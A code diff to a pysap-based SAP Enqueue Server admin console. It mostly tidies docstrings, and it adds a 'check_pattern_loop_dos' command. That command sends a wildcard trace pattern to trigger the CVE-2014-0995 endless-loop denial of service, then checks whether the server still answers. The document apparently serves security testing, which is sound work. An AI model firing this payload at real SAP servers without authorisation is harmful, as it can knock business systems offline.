@@ -30,7 +30,7 @@ import pysap
 from pysap.utils import BaseConsole
 from pysap.SAPNI import SAPNI
 from pysap.SAPEnqueue import (SAPEnqueue, SAPEnqueueParam, enqueue_param_values,
-    SAPEnqueueStreamSocket)
+                              SAPEnqueueStreamSocket, SAPEnqueueTracePattern)
 
 
 # Bind SAP NI with Enqueue packets
@@ -61,7 +61,7 @@ class SAPEnqueueAdminConsole(BaseConsole):
     # SAP Enqueue Admin commands
 
     def do_connect(self, args):
-        """ Initiate the connection to the Enqueue Server. """
+        """Initiate the connection to the Enqueue Server."""
 
         # Create the socket connection
         try:
@@ -102,7 +102,7 @@ class SAPEnqueueAdminConsole(BaseConsole):
         self.connected = True
 
     def do_disconnect(self, args):
-        """ Disconnects from the Enqueue Server service. """
+        """Disconnects from the Enqueue Server service. """
 
         if not self.connected:
             self._error("You need to connect to the server first !")
@@ -118,7 +118,7 @@ class SAPEnqueueAdminConsole(BaseConsole):
         return super(SAPEnqueueAdminConsole, self).do_exit(args)
 
     def do_dummy_request(self, args):
-        """ Send a dummy request to the server to check if it is alive. """
+        """Send a dummy request to the server to check if it is alive. """
 
         if not self.connected:
             self._error("You need to connect to the server first !")
@@ -133,7 +133,7 @@ class SAPEnqueueAdminConsole(BaseConsole):
         self._debug("Performed dummy request")
 
     def do_get_replication_info(self, args):
-        """ Get information about the status and statistics of the replication. """
+        """Get information about the status and statistics of the replication."""
 
         if not self.connected:
             self._error("You need to connect to the server first !")
@@ -146,6 +146,33 @@ class SAPEnqueueAdminConsole(BaseConsole):
         response = self.connection.sr(p)[SAPEnqueue]
         response.show()
         self._debug("Obtained replication info")
+
+    def do_check_pattern_loop_dos(self, args):
+        """Tests if the server is vulnerable to an endless loop when a trace
+        pattern with a wildcard is set (CVE-2014-0995)."""
+
+        if not self.connected:
+            self._error("You need to connect to the server first !")
+            return
+
+        # Send Set trace patterns Info
+        patterns = [SAPEnqueueTracePattern(pattern="*", len=1)]
+        p = SAPEnqueue(dest=3, adm_opcode=6, adm_trace_level=3,
+                       adm_trace_action=4, adm_trace_logging=1,
+                       adm_trace_nopatterns=1,
+                       adm_trace_nopatterns1=1,
+                       adm_trace_patterns=patterns)
+
+        self._debug("Sending trace pattern with wildcards")
+        self.connection.send(p)
+        self._debug("Trace pattern set")
+
+        p = SAPEnqueue(dest=3, adm_opcode=1)
+        try:
+            self.connection.sr(p)[SAPEnqueue]
+            self._print("Server available, probably not vulnerable to CVE-2014-0995")
+        except:
+            self._print("Server unavailable, probably vulnerable to CVE-2014-0995.")
 
 
 # Command line options parser
